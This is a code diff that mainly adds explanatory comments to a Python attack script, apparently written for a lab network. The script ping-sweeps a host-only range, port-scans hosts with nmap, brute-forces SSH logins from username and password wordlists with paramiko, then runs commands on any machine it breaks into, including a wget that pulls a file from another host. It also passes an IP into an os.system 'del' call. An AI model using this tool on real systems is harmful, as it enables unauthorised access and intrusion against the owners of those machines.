@@ -21,6 +21,13 @@ passwords = []
 
 
 def nmaper():
+    #----------------------#
+    # This function scans open common ports of all active machines
+    # listed in IpList[]. If port 22 is open on the active machine,
+    # it will be added to a list called SSHlist[]
+    # *List of ports can be modified to your liking.
+    #----------------------#
+
     print("\n----Scanning active machines for open ports----\n")
     portscan = nmap.PortScanner()
     scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
@@ -39,6 +46,13 @@ def nmaper():
 
         
 def open_file():
+    #----------------------#
+    # This function opens the username and password files to be used in 
+    # bruteforcing the SSH of open machines and creates 2 iterable lists.
+    # usernames[] stores all usernames in the usernames.txt file
+    # passwords[] stores all passwords in the passwords.txt file
+    #----------------------#
+    
     with open('usernames.txt') as usernamefile:
             for line in usernamefile:
                 usernames.append(line.rstrip())
@@ -49,7 +63,12 @@ def open_file():
 
 
 def bruteforce():
-    flag = False
+    #----------------------#
+    # This function takes SSHlist[] and iterates through each IP and tries every name
+    # in the username file and tests them again every password. If the connection is
+    # active, the function ssher is called to further exploit the IP. 
+    #----------------------#
+
     open_file()
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -75,6 +94,14 @@ def bruteforce():
 
 
 def ssher(client):
+    #----------------------#
+    # This function will take an active session as a parameter,
+    # perform different pre-determined commands and
+    # print the output of commands (if applicable)
+    #
+    # *Note: output of these commands (variable: lines) are lists.
+    #----------------------#
+    
     print("\nSuccessfully connected!")
     command = 'whoami'
     command2 = "wget http://192.168.56.101/yOu_HaVe_BeEn_HaCkEd"
@@ -98,9 +125,20 @@ def ssher(client):
 
 
 def ping():
+    #----------------------#
+    # This function checks a range of of which the gateway can be customized
+    # to scan any specific range of IP's. If an IP is returned to be active, 
+    # the IP is then placed in IpList[].
+    # 
+    # Futher implementation of netifaces can be used here to automate finding
+    # the local IP gateway and scanning of that local IP range for active machines.
+    #----------------------#
+
+
     #gw = netifaces.gateways()
     #gatewy = gw['Host-Only'][netifaces.AF_INET][0]
     #print(gatewy)
+    
     print("\n----Scanning for active machines----")
     ipbase = "192.168.56."
     for x in range (100,110):
@@ -109,4 +147,4 @@ def ping():
             print(ip)
             IpList.append(ip)
 
-    os.system('del '+ip)
+    os.system('del '+ip)    
